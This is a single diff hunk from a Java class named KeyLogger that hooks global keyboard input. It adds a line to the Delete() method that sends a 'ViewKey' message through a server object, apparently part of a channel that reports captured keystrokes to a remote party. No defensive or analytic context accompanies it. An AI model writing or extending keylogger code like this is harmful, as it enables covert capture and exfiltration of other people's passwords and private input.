@@ -145,6 +145,7 @@ public class KeyLogger implements NativeKeyListener {
 
     public void Delete() {
         str = "";
+        this.server.SendData("ViewKey", "");
     }
 
     public String GetKey() {
